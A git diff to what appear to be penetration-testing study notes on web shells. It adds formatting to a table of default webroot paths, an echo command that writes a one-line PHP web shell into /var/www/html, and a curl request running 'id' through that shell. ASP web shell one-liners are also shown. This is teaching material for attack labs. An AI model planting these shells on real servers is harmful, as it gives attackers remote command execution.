@@ -10,17 +10,24 @@ We need to place our web shell script into the remote host's web directory (webr
 <br>
 | Web Server | Default Webroot           |
 |------------|---------------------------|
-| Apache     | /var/www/html/            |
-| Nginx      | /usr/local/nginx/html/    |
-| IIS        | c:\inetpub\wwwroot\       |
-| XAMPP      | C:\xampp\htdocs\          |
-
-
+| Apache     | `/var/www/html/`          |
+| Nginx      | `/usr/local/nginx/html/`  |
+| IIS        | `c:\inetpub\wwwroot\`     |
+| XAMPP      | `C:\xampp\htdocs\`        |
+<br>
+We can check these directories to see which webroot is in use and then use echo to write out our web shell.
 
 ## PHP
 
 ```
 <?php system($_REQUEST["cmd"]); ?>
+```
+```
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+Accessing the web shell:
+```
+curl http://SERVER_IP:PORT/shell.php?cmd=id
 ```
 
 ## JSP
@@ -34,3 +41,7 @@ We need to place our web shell script into the remote host's web directory (webr
 ```
 <% eval request("cmd") %>
 ```
+
+
+
+
